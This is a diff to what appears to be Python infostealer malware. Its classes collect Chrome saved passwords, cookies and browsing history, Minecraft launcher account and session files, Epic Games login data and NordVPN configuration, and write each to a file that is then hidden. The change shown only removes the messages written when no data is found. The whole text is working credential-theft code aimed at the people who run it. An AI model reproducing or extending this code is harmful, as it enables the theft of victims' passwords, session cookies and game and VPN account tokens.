@@ -414,10 +414,6 @@ class chrome():
                 cursor.close()
                 conn.close()
                 os.remove("Loginvault.db")
-            else:
-                with open(".\\google-passwords.txt", "w", encoding="utf-8") as f:
-                    f.write("No google passwords were found :(")
-
         hide("google-passwords.txt")
 
     def cookies(self):
@@ -442,10 +438,6 @@ class chrome():
                 cursor.close()
                 conn.close()
                 os.remove("Cookievault.db")
-            else:
-                with open(".\\google-cookies.txt", "w", encoding="utf-8") as f:
-                    f.write("No google chrome cookies were found :(")
-
         hide("google-cookies.txt")
 
     def history(self):
@@ -475,10 +467,6 @@ class chrome():
                 cursor.close()
                 conn.close()
                 os.remove("Historyvault.db")
-            else:
-                with open(".\\google-history.txt", "a", encoding="utf-8") as f:
-                    f.write("No google chrome history was found :(")
-
         hide("google-history.txt")
 
 
@@ -529,13 +517,10 @@ class mc_tokens():
 
     def session_info(self):
         with open((".\\minecraft-sessioninfo.json"), 'w', encoding="cp437", errors='ignore') as f:
-            if os.path.exists(self.roaming +
-                              "\\.minecraft\\launcher_accounts.json"):
+            if os.path.exists(self.roaming + "\\.minecraft\\launcher_accounts.json"):
                 with open(self.roaming + "\\.minecraft\\launcher_accounts.json", "r") as g:
                     self.session = json.load(g)
                     f.write(json.dumps(self.session, indent=4))
-            else:
-                f.write("No minecraft accounts or access tokens :(")
         hide(".\\minecraft-sessioninfo.json")
 
     def user_cache(self):
@@ -544,8 +529,6 @@ class mc_tokens():
                 with open(self.roaming + "\\.minecraft\\usercache.json", "r") as g:
                     self.user = json.load(g)
                     f.write(json.dumps(self.user, indent=4))
-            else:
-                f.write("No minecraft accounts or access tokens :(")
         hide(".\\minecraft-usercache.json")
 
 
@@ -566,9 +549,6 @@ class epicgames_data():
                     for line in f.readlines():
                         if line.startswith("Data="):
                             g.write(line.split('Data=')[1].strip())
-            else:
-                g.write("No epic games data was found :(")
-
         hide(".\\epicgames-data.txt")
 
 
@@ -587,10 +567,6 @@ class grabnordvpn():
             if os.path.exists(self.nord):
                 with open(self.nord, 'r') as n:
                     f.write(n.read())
-
-            else:
-                f.write(f"No nord vpn data was found :(")
-
         hide(".\\nordvpn-data.txt")
 
 
